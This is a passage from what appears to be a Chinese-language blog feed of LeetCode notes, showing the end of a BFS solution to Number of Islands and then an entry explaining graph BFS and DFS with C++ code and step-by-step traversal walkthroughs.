class="number">0</span> &amp;&amp; grid[i][j] == <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">                    visited[i][j] = <span class="number">1</span>;</span><br><span class="line">                    count++;</span><br><span class="line">                    q.<span class="built_in">push</span>(&#123;i,j&#125;);</span><br><span class="line">                    <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                        pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;f = q.<span class="built_in">front</span>();</span><br><span class="line">                        q.<span class="built_in">pop</span>();</span><br><span class="line">                        <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>; k&lt;<span class="number">4</span> ;k++)&#123;</span><br><span class="line">                            <span class="type">int</span> subRow = f.first + offsetRow[k];</span><br><span class="line">                            <span class="type">int</span> subCol = f.second + offsetCol[k];</span><br><span class="line">                            <span class="keyword">if</span>(subRow&gt;=<span class="number">0</span> &amp;&amp; subRow &lt; row &amp;&amp; subCol &gt;=<span class="number">0</span> &amp;&amp; subCol &lt; col &amp;&amp; grid[subRow][subCol]==<span class="string">&#x27;1&#x27;</span> &amp;&amp; visited[subRow][subCol] == <span class="number">0</span>)&#123;</span><br><span class="line">                                visited[subRow][subCol] = <span class="number">1</span>;</span><br><span class="line">                                q.<span class="built_in">push</span>(&#123;subRow, subCol&#125;);</span><br><span class="line">                            &#125;</span><br><span class="line">                            </span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>BFS 的做法就是透過一個 queue 將尚未訪問且為島嶼的節點推入,並且對於每一層節點,會去找出與他相臨的上下左右的節點是否是島嶼，如果相鄰節點是島嶼且尚未造訪則將其推入到 Queue 中, 並且將 <code>visited</code> 標注為 1。 但核心思想其實一樣，都是要找 connected components 的數量。</p><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/200/result2.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><table><thead><tr><th>方法</th><th>時間複雜度</th><th>空間複雜度</th><th>分析</th></tr></thead><tbody><tr><td><strong>DFS 方法</strong></td><td>$O(M \times N)$</td><td>$O(M \times N)$</td><td>- 每個節點最多訪問一次，遞迴深度最多為島嶼的大小，需額外的遞迴棧空間（最壞情況 $O(M \times N)$）。</td></tr><tr><td><strong>BFS 方法</strong></td><td>$O(M \times N)$</td><td>$O(M \times N)$</td><td>- 每個節點最多訪問一次，使用隊列存儲節點，隊列的大小與整個島嶼的節點數成比例。</td></tr></tbody></table><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Graph </tag>
            
            <tag> DFS </tag>
            
            <tag> Matrix </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷題知識整理 | 圖(Graph)-2</title>
      <link href="/posts/2e799f6d.html"/>
      <url>/posts/2e799f6d.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>這裡接續前一篇關於 <a href="https://leozzmc.github.io/posts/2009beb7.html">圖的基本介紹</a>，接著需要來了解在圖中要如何搜尋特定的 vertex，也就是需要知道怎麼走訪圖，主要有三種基本的演算法:</p><ul><li>Breadth-First Search (BFS)： 用於有向和無向圖的走訪</li><li>Depth-First Search (DFS)：用於有向和無向圖的走訪</li><li>Topological Search： 用於偵測有向無環圖(Directed Acyclic Graph, DAG)的偵測。</li></ul><h1 id="BFS"><a href="#BFS" class="headerlink" title="BFS"></a>BFS</h1><p>以前有介紹過 <a href="https://leozzmc.github.io/posts/tree_for_leetcode.html?highlight=tree#Level-order-Traversal">Tree的 BFS(Level-Order Traversal)</a>，Level-Order 會依序造訪不同level的節點，而level 其實就對應到 Graph概念中節點與節點之間的距離(Distance)，它其實就代表 root 和 node 之間的距離。 那圖的 BFS又會有哪些差異呢？如果要走訪一個 connected 的無向圖，那可以由任意節點(假設是 vertex(A))出發，另外由於是 connected 的， <strong>因此可以走訪跟 vertex(A)相同connected components的所有節點，並且獲得距離vertex(A)的最短距離，和可走的路徑</strong></p><h2 id="演算法介紹"><a href="#演算法介紹" class="headerlink" title="演算法介紹"></a>演算法介紹</h2><p>進行 <code>bfs()</code> 之前會需要幾個資料結構來儲存走訪過程中的資料：</p><div class="note info flat"><ul><li>queue：跟 Tree BFS 一樣，用於依序紀錄各層節點</li><li>label：用於紀錄每個節點查找狀態，需要紀錄 <code>找過</code>, <code>沒找過</code>, <code>已移除</code></li><li>distance array：用來記錄各節點距離起點的距離</li><li>predecessor array：用來紀錄每個節點是由是從節點找到，可以用來回溯路徑</li></ul></div><details class="toggle" style="border: 1px solid bg"><summary class="toggle-button" style="background-color: bg;color: color">Step1 初始化資料結構 </summary><div class="toggle-content"><p><img src="/img/LeetCode/graph/init.png"></p></div></details><p>首先需要初始化:</p><ul><li>所有 vertex 都是 <code>沒找到</code></li><li>所有 vertex 的距離都設無限大</li><li>將所有 vertex 的 predecessor 清除(<code>NULL</code> 或 <code>-1</code>)</li><li>建立一個空的queue</li></ul><details class="toggle" style="border: 1px solid bg"><summary class="toggle-button" style="background-color: bg;color: color">Step2 Push起點 </summary><div class="toggle-content"><p><img src="/img/LeetCode/graph/bfs-1.png"></p></div></details><p>接著</p><p>(1) 將起點 push 到 queue 中，這裡選擇起點為 vertex(A)<br>(2) 將vertex(A) 標注為 <code>已找到</code> (這裏用灰色表示)<br>(3) 並且將 <code>distance[A]</code> 設為 0， <strong>設為0就代表這個vertex會是這個connected components 上的起點</strong><br>(4) <code>predecessor[A]</code> 不變，這樣代表在 BFS結束後，只要 <code>predecessor</code> 值為 null 的節點即為起點</p><details class="toggle" style="border: 1px solid bg"><summary class="toggle-button" style="background-color: bg;color: color">Step3 Search Neighbors </summary><div class="toggle-content"><p><img src="/img/LeetCode/graph/bfs-2.png"></p></div></details><p>接著需要以 <strong>queue 的 front 作為新的搜尋起點</strong> ，新的起點會是 vertex(A)，這時需要搜尋 vertex(A) 的鄰居，vertex(A)的 neighbor可以從 Adjacency Matrix或 Adjacency List 中獲得。找到後需要做三件事：</p><p>(1)將搜尋到的vertex標注為 <code>已找到</code> (這裏用灰色表示)<br>(2) 將搜尋到節點對應的 distance 設為 <code>distance[A]+1</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">distance[B] = distance[A]+1 = 1 </span><br><span class="line">distance[C] = distance[A]+1 = 1 </span><br></pre></td></tr></table></figure><p>(3) 將搜尋到節點的 predecessor 設為 vertex(A)<br>(4) 按照節點找到的順序，依序push進queue<br>(5) 將 vertex(A) 移出 Queue</p><p>繼續以queue的front當作新的起點搜尋。這時新的起點會是 vertex(B)，這時需要搜尋 vertex(B) 的鄰居</p><details class="toggle" style="border: 1px solid bg"><summary class="toggle-button" style="background-color: bg;color: color">Step4 vertex(B) Search Neighbors </summary><div class="toggle-content"><p><img src="/img/LeetCode/graph/bfs-4.png"></p></div></details><p>(1)將vertex(D), vertex(E)標注為 <code>已找到</code> (這裏用灰色表示)<br>(2) 將搜尋到節點對應的 distance 設為 <code>distance[B]+1</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">distance[D] = distance[B]+1 = 2 </span><br><span class="line">distance[E] = distance[B]+1 = 2 </span><br></pre></td></tr></table></figure><p>(3) 將搜尋到節點的 predecessor 設為 vertex(B)<br>(4) 按照節點找到的順序，依序push進queue<br>(5) 將 vertex(B) 移出 Queue</p><p>由於 vertex(B) 已經被移除了，因此queue的新的front - vertex(C) 會是新的起點。 </p><details class="toggle" style="border: 1px solid bg"><summary class="toggle-button" style="background-color: bg;color: color">Step5 vertex(C) Search Neighbors </summary><div class="toggle-content"><p><img src="/img/LeetCode/graph/bfs-5.png"></p></div></details><p>(1)將vertex(F)標注為 <code>已找到</code> (這裏用灰色表示)<br>(2) 將搜尋到節點對應的 distance 設為 <code>distance[C]+1</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">distance[F] = distance[C]+1 = 2 </span><br></pre></td></tr></table></figure><p>(3) 將搜尋到節點的 predecessor 設為 vertex(C)<br>(4) 按照節點找到的順序，依序push進queue<br>(5) 將 vertex(C) 移出 Queue</p><p>之後一路重複循環，直到 queue被清空，則完成圖的 BFS 走訪</p><details class="toggle" style="border: 1px solid bg"><summary class="toggle-button" style="background-color: bg;color: color">Following Steps </summary><div class="toggle-content"><p><img src="/img/LeetCode/graph/bfs-6.png"></p></div></details><h2 id="程式碼實作"><a href="#程式碼實作" class="headerlink" title="程式碼實作"></a>程式碼實作</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;climits&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Graph</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="type">int</span> num_vertex;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; adjList;</span><br><span class="line">        <span class="type">int</span> *label,  <span class="comment">// 0: not found, 1: found, 2. removed</span></span><br><span class="line">            *distance,  <span class="comment">// 0: starting point, MAX_INT: vertex that cannot be found by the starting point</span></span><br><span class="line">            *predecessor; <span class="comment">// -1: no predecessor, starting point</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="built_in">Graph</span>(): <span class="built_in">num_vertex</span>(<span class="number">0</span>) &#123;&#125;;</span><br><span class="line">        <span class="built_in">Graph</span>(<span class="type">int</span> N): <span class="built_in">num_vertex</span>(N)&#123;</span><br><span class="line">            adjList.<span class="built_in">resize</span>(num_vertex);</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//member function</span></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">addEdgeList</span><span class="params">(<span class="type">int</span> from, <span class="type">int</span> to)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">bfs</span><span class="params">(<span class="type">int</span> start)</span></span>;</span><br><span class="line">        </span><br><span class="line">         <span class="comment">// Getter functions for debugging</span></span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">getNumVertex</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> num_vertex; &#125;</span><br><span class="line">        <span class="function"><span class="type">int</span>* <span class="title">getDistances</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> distance; &#125;</span><br><span class="line">        <span class="function"><span class="type">int</span>* <span class="title">getPredecessors</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> predecessor; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Graph::addEdgeList</span><span class="params">(<span class="type">int</span> from, <span class="type">int</span> to)</span></span>&#123;</span><br><span class="line">    adjList[from].<span class="built_in">push_back</span>(to);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Graph::bfs</span><span class="params">(<span class="type">int</span> start)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// init the arrays</span></span><br><span class="line">    label = <span class="keyword">new</span> <span class="type">int</span>[num_vertex];</span><br><span class="line">    distance = <span class="keyword">new</span> <span class="type">int</span>[num_vertex];</span><br><span class="line">    predecessor = <span class="keyword">new</span> <span class="type">int</span>[num_vertex];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;num_vertex; i++)&#123;</span><br><span class="line">        label[i] = <span class="number">0</span>;</span><br><span class="line">        distance[i] = INT_MAX;</span><br><span class="line">        predecessor[i] = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">    <span class="type">int</span> i=start;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;num_vertex; j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(label[i]==<span class="number">0</span>)&#123;</span><br><span class="line">            label[i]=<span class="number">1</span>;</span><br><span class="line">            distance[i]=<span class="number">0</span>;</span><br><span class="line">            predecessor[i]=<span class="number">-1</span>;</span><br><span class="line">            q.<span class="built_in">push</span>(i);</span><br><span class="line">            <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                <span class="type">int</span> u = q.<span class="built_in">front</span>();</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">auto</span> it=adjList[u].<span class="built_in">begin</span>(); it!=adjList[u].<span class="built_in">end</span>(); ++it)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(label[*it]==<span class="number">0</span>)&#123;</span><br><span class="line">                        label[*it]=<span class="number">1</span>;</span><br><span class="line">                        distance[*it] = distance[u] + <span class="number">1</span>;</span><br><span class="line">                        predecessor[*it] = u;</span><br><span class="line">                        q.<span class="built_in">push</span>(*it);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                q.<span class="built_in">pop</span>();</span><br><span class="line">                label[u] = <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        i =j;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//construct the graph</span></span><br><span class="line">    <span class="function">Graph <span class="title">g1</span><span class="params">(<span class="number">8</span>)</span></span>;</span><br><span class="line">    g1.<span class="built_in">addEdgeList</span>(<span class="number">0</span>,<span class="number">1</span>); g1.<span class="built_in">addEdgeList</span>(<span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line">    g1.<span class="built_in">addEdgeList</span>(<span class="number">1</span>,<span class="number">0</span>); g1.<span class="built_in">addEdgeList</span>(<span class="number">1</span>,<span class="number">3</span>); g1.<span class="built_in">addEdgeList</span>(<span class="number">1</span>,<span class="number">4</span>);</span><br><span class="line">    g1.<span class="built_in">addEdgeList</span>(<span class="number">2</span>,<span class="number">0</span>); g1.<span class="built_in">addEdgeList</span>(<span class="number">2</span>,<span class="number">5</span>);</span><br><span class="line">    g1.<span class="built_in">addEdgeList</span>(<span class="number">3</span>,<span class="number">1</span>); g1.<span class="built_in">addEdgeList</span>(<span class="number">3</span>,<span class="number">4</span>); g1.<span class="built_in">addEdgeList</span>(<span class="number">3</span>,<span class="number">6</span>);g1.<span class="built_in">addEdgeList</span>(<span class="number">3</span>,<span class="number">7</span>);</span><br><span class="line">    g1.<span class="built_in">addEdgeList</span>(<span class="number">4</span>,<span class="number">1</span>); g1.<span class="built_in">addEdgeList</span>(<span class="number">4</span>,<span class="number">3</span>); g1.<span class="built_in">addEdgeList</span>(<span class="number">4</span>,<span class="number">5</span>); g1.<span class="built_in">addEdgeList</span>(<span class="number">3</span>,<span class="number">7</span>);</span><br><span class="line">    g1.<span class="built_in">addEdgeList</span>(<span class="number">5</span>,<span class="number">2</span>); g1.<span class="built_in">addEdgeList</span>(<span class="number">5</span>,<span class="number">4</span>); g1.<span class="built_in">addEdgeList</span>(<span class="number">5</span>,<span class="number">6</span>); </span><br><span class="line">    g1.<span class="built_in">addEdgeList</span>(<span class="number">6</span>,<span class="number">3</span>); g1.<span class="built_in">addEdgeList</span>(<span class="number">6</span>,<span class="number">5</span>); g1.<span class="built_in">addEdgeList</span>(<span class="number">6</span>,<span class="number">7</span>);</span><br><span class="line">    g1.<span class="built_in">addEdgeList</span>(<span class="number">7</span>,<span class="number">3</span>); g1.<span class="built_in">addEdgeList</span>(<span class="number">7</span>,<span class="number">4</span>); g1.<span class="built_in">addEdgeList</span>(<span class="number">7</span>,<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    g1.<span class="built_in">bfs</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; g1.<span class="built_in">getNumVertex</span>(); i++) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Distance[&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;]: &quot;</span> &lt;&lt; g1.<span class="built_in">getDistances</span>()[i] &lt;&lt; <span class="string">&quot; | &quot;</span>;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Predecessor[&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;]: &quot;</span> &lt;&lt; g1.<span class="built_in">getPredecessors</span>()[i] &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>輸出結果:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Distance[0]: 0  | Predecessor[0]: -1</span><br><span class="line">Distance[1]: 1  | Predecessor[1]: 0</span><br><span class="line">Distance[2]: 1  | Predecessor[2]: 0</span><br><span class="line">Distance[3]: 2  | Predecessor[3]: 1</span><br><span class="line">Distance[4]: 2  | Predecessor[4]: 1</span><br><span class="line">Distance[5]: 2  | Predecessor[5]: 2</span><br><span class="line">Distance[6]: 3  | Predecessor[6]: 3</span><br><span class="line">Distance[7]: 3  | Predecessor[7]: 3</span><br></pre></td></tr></table></figure><h2 id="延伸概念"><a href="#延伸概念" class="headerlink" title="延伸概念"></a>延伸概念</h2><p>透過得到的 <code>predecessor</code> 陣列，可以知道由起點開始的節點先後關係，可以畫出一個 predecessor subgraph，通常具有 connected 和 acyclic 的特性，這使得 predecessor subgraph 會是一個以起始點 vertex 為root的一顆tree，這種樹又被稱為 <strong>Breadth-First Tree</strong> 其中相互連接vertex的edge 又被稱為 <strong>Tree Edge</strong> </p><p><img src="/img/LeetCode/graph/subgraph-1.png"></p><div class="note info flat"><p>一張圖的 Breadth-First Tree 可能不只一種，因為 Predecessor Array 會是由發現vertex 的先後順序組成，而vertex 發現順序則是會被建構 adjList 的順序所影響，順序不同則建構出的 Breadth-First Tree 也不盡相同。 雖然 Breadth-First Tree 結構不同，最後節點與節點彼此的距離依舊相同。 (使用 <code>vector&lt;vector&lt;int&gt;&gt;</code> 作為鄰接表時，鄰居節點的遍歷順序取決於節點在 <code>vector&lt;int&gt;</code> 中的排列順序（即插入順序）)</p></div><blockquote><p>若 Graph 本身包含多個 connected components，則可能可以畫出 Breadth-First Forest</p></blockquote><h1 id="DFS"><a href="#DFS" class="headerlink" title="DFS"></a>DFS</h1><p>先前有介紹過 <a href="https://leozzmc.github.io/posts/tree_for_leetcode.html?highlight=tree#Pre-Order-Traversal">樹的 DFS</a>，其中一種DFS走訪方式會是 Pre-order Traversal，也就是先拜訪節點，再拜訪其左子樹，再拜訪該root的右子樹， <strong>這種遇到節點先拜訪的特性會是Graph DFS 的核心精神，在 Graph 中，先拜訪節點，再以該節點作為新的搜尋起點，直到有edge相連的 vertex 都被搜尋到</strong> ， 另外也如同樹的走訪一樣或者走迷宮一樣，只要 vertex 彼此透過 edge  相連，一條路不同就回到上個 vertex走別條edge相連的路。</p><blockquote><p>DFS 能保證的是，若有Edge 相連，一定能找到 Path，但不能保證 Shortest Path </p></blockquote><h2 id="演算法介紹-1"><a href="#演算法介紹-1" class="headerlink" title="演算法介紹"></a>演算法介紹</h2><p>進行 <code>dfs()</code> 之前為了方便解釋，會需要以下的資料結構：</p><div class="note info flat"><ul><li>time: dfs 走訪是有先後順序的，這裡可以想成是有個時間軸，N個節點一共會有 2N 個時間點 (每個節點都會有開始跟結束搜尋)</li><li>discover array: 紀錄Vertex被發現的時間點(time)，如果 vertex(B) 由 vertex(A) 找到，則 discover[B] &#x3D; discover[A]+1</li><li>finish array: 如過 vertex(B) 已經完全搜尋過透過有效edge與之相連的所有vertex，則代表從 vertex(B) 為起點的搜尋已經結束，標注為 finish[B]</li><li>visited array: 用來紀錄哪些節點未發現或者已發現在但尚未結束搜尋以及結束等狀態</li><li>predecessor array: 紀錄走訪的 vertex 是由哪個 vertex 發現到的，可以用於回溯路徑</li></ul></div><details class="toggle" style="border: 1px solid bg"><summary class="toggle-button" style="background-color: bg;color: color">Step0 初始化資料結構 </summary><div class="toggle-content"><p><img src="/img/LeetCode/graph/dfs.png"></p></div></details><p>(1) <code>time</code> 為 0<br>(2) visited array 初始化為0<br>(3) 所有的 discover, finish array 初始化為0<br>(4) predecessor array 初始化為 -1 或 null</p><details class="toggle" style="border: 1px solid bg"><summary class="toggle-button" style="background-color: bg;color: color">Step1 ~ Step8 依序拜訪和回溯節點 </summary><div class="toggle-content"><p><img src="/img/LeetCode/graph/dfs-2.png"></p></div></details><p><em>Step1 - vertex(A) 為起點</em><br>(1) vertex(A) 會標注 visited  (這裡用綠色表示)<br>(2) 由於 vertex(A) 被發現，因此需要將 <code>discover[A]</code> 設置為 <code>++time</code> (所以這裡 <code>discover[A]=1</code>) 代表他是 <code>dfs</code> 的起點<br>(3) 接著需要搜尋與 vertex(A) 相連的節點，這裡可以觀察到 Adjacency List 中第一個與 vertex(A)相連的節點會是 vertex(B)，所以下一個起點會是 vertex(B)</p><blockquote><p>此時無需更新 <code>finish[A]</code>，因為以 vertex(A) 為起點的搜尋還在進行中，並非所有與 vertex(A)相連的edge都已經搜尋完畢了</p></blockquote><p><em>Step2 - vertex(B) 為起點</em><br>(1) vertex(B) 會標注 visited  (這裡用綠色表示)<br>(2) 由於 vertex(B) 被發現，因此需要將 <code>discover[B]</code> 設置為 <code>++time</code> (所以這裡 <code>discover[B]=2</code>)<br>(3) 接著需要搜尋與 vertex(B) 相連的節點，這裡可以從 Adjacency List 觀察到下一個節點會是 vertex(D)</p><p><em>Step3 - vertex(D) 為起點</em><br>(1) vertex(D) 會標注 visited  (這裡用綠色表示)<br>(2) 由於 vertex(D) 被發現，因此需要將 <code>discover[D]</code> 設置為 <code>++time</code> (所以這裡 <code>discover[D]=3</code>)<br>(3) 接著需要搜尋與 vertex(D) 相連的節點，這裡可以從 Adjacency List 觀察到下一個節點會是 vertex(H)</p><p><em>Step4~5 - vertex(H) 為起點</em><br>(1) vertex(H) 會標注 visited  (這裡用綠色表示)<br>(2) 由於 vertex(H) 被發現，因此需要將 <code>discover[H]</code> 設置為 <code>++time</code> (所以這裡 <code>discover[H]=4</code>)<br>(3) 接著需要搜尋與 vertex(H) 相連的節點，這裡可以從 Adjacency List 觀察到， <strong>vertex(H) 並沒有下一個節點，因此需要退回上一個節點，也就是 vertex(D)</strong><br>(4) vertex(H) 標注為 finished (這裏用藍色表示)<br>(5) 更新 <code>finish</code> 為 <code>++time</code> (所以這裡 <code>finish[H]=5</code>)</p><p><em>Step6 - vertex(D) 為起點</em><br>(1) <strong>由於已標注 visited，因此接續搜尋其他相連但尚未 visited 的節點</strong> ，這裡可以從 Adjacency List 觀察到， <strong>vertex(D) 並沒有其他節點相連，因此需要退回上一個節點，也就是 vertex(B)</strong><br>(4) vertex(D) 標注為 finished (這裏用藍色表示)<br>(5) 更新 <code>finish</code> 為 <code>++time</code> (所以這裡 <code>finish[D]=6</code>)</p><p><em>Step7 - vertex(B) 為起點</em><br>(1) <strong>由於已標注 visited，因此接續搜尋其他相連但尚未 visited 的節點</strong> ，這裡可以從 Adjacency List 觀察到， <strong>vertex(B) 並沒有其他節點相連，因此需要退回上一個節點，也就是 vertex(A)</strong><br>(4) vertex(B) 標注為 finished (這裏用藍色表示)<br>(5) 更新 <code>finish</code> 為 <code>++time</code> (所以這裡 <code>finish[B]=7</code>)</p><p><em>Step8 - vertex(A) 為起點</em><br>(1) <strong>由於已標注 visited，因此接續搜尋其他相連但尚未 visited 的節點</strong> ，這裡可以從 Adjacency List 觀察到， <strong>vertex(A) 下一個相連的節點會是 vertex(C)</strong> ，所以下一個起點會是 vertex(C)</p><details class="toggle" style="border: 1px solid bg"><summary class="toggle-button" style="background-color: bg;color: color">Step9 ~ Step16 依序拜訪和回溯節點 </summary><div class="toggle-content"><p><img src="/img/LeetCode/graph/dfs-3.png"></p></div></details><p><em>Step9 - vertex(C) 為起點</em><br>(1) vertex(C) 會標注 visited  (這裡用綠色表示)<br>(2) 由於 vertex(C) 被發現，因此需要將 <code>discover[C]</code> 設置為 <code>++time</code> (所以這裡 <code>discover[D]=8</code>)<br>(3) 接著需要搜尋與 vertex(C) 相連的節點，這裡可以從 Adjacency List 觀察到下一個節點會是 vertex(F)</p><p><em>Step10 - vertex(F) 為起點</em><br>(1) vertex(F) 會標注 visited  (這裡用綠色表示)<br>(2) 由於 vertex(F) 被發現，因此需要將 <code>discover[F]</code> 設置為 <code>++time</code> (所以這裡 <code>discover[F]=9</code>)<br>(3) 接著需要搜尋與 vertex(F) 相連的節點，這裡可以從 Adjacency List 觀察到下一個節點會是 vertex(E)</p><p><em>Step11 - vertex(E) 為起點</em><br>(1) vertex(E) 會標注 visited  (這裡用綠色表示)<br>(2) 由於 vertex(E) 被發現，因此需要將 <code>discover[E]</code> 設置為 <code>++time</code> (所以這裡 <code>discover[E]=10</code>)<br>(3) 接著需要搜尋與 vertex(E) 相連的節點，這裡可以從 Adjacency List 觀察到，vertex(E) 相連的節點都已經拜訪過了，因此需要回到上一個節點 vertex(F)<br>(4) vertex(E) 標注為 finished (這裏用藍色表示)<br>(5) 更新 <code>finish</code> 為 <code>++time</code> (所以這裡 <code>finish[E]=11</code>)</p><p><em>Step12 - vertex(F) 為起點</em><br>(1) <strong>由於已標注 visited，因此接續搜尋其他相連但尚未 visited 的節點</strong> ，這裡可以從 Adjacency List 觀察到， <strong>vertex(F) 下一個相連的節點會是 vertex(G)</strong> ，所以下一個起點會是 vertex(G)</p><p><em>Step13 - vertex(G) 為起點</em><br>(1) vertex(G) 會標注 visited  (這裡用綠色表示)<br>(2) 由於 vertex(G) 被發現，因此需要將 <code>discover[G]</code> 設置為 <code>++time</code> (所以這裡 <code>discover[G]=12</code>)<br>(3) 接著需要搜尋與 vertex(G) 相連的節點，這裡可以從 Adjacency List 觀察到，vertex(G) 相連的節點都已經拜訪過了，因此需要回到上一個節點 vertex(F)<br>(4) vertex(E) 標注為 finished (這裏用藍色表示)<br>(5) 更新 <code>finish</code> 為 <code>++time</code> (所以這裡 <code>finish[G]=13</code>)</p><p><em>Step14 - vertex(F) 為起點</em><br>(1) vertex(F) 